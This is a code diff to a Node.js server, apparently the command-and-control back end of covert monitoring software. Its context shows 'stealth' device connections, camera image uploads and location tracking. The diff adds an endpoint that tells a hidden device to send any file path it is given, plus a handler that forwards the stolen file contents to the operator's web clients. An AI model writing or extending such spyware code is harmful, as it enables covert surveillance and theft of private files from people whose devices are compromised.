@@ -110,6 +110,23 @@ wss.on("connection", (ws, req) => {
   console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
   return;
 }
+
+        // В обработчике WebSocket для устройств добавьте:
+if (msg.type === 'file_download') {
+  console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
+  
+  // Транслируем файл веб-клиентам
+  broadcastToWebClients({
+    type: 'file_download',
+    deviceId: deviceId,
+    filename: msg.filename,
+    data: msg.data,
+    size: msg.size,
+    timestamp: msg.timestamp || Date.now()
+  });
+  
+  return;
+}
         
         if (msg.type === 'image') {
           const deviceInfo = stealthConnections.get(deviceId);
@@ -262,6 +279,28 @@ app.post("/api/device/command", (req, res) => {
   }
   
   return res.json({ success: true });
+});
+
+app.post("/api/device/download-file", (req, res) => {
+  const { device_id, file_path, token } = req.body;
+  
+  if (token !== SECRET_TOKEN) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+  
+  const entry = stealthConnections.get(device_id);
+  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
+    // Отправляем команду устройству
+    entry.ws.send(JSON.stringify({ 
+      action: 'download_file',
+      file_path: file_path,
+      timestamp: Date.now() 
+    }));
+    
+    res.json({ success: true, message: 'File request sent' });
+  } else {
+    res.status(404).json({ error: 'Device offline' });
+  }
 });
 
 app.post("/api/camera/image", (req, res) => {
@@ -480,6 +519,7 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
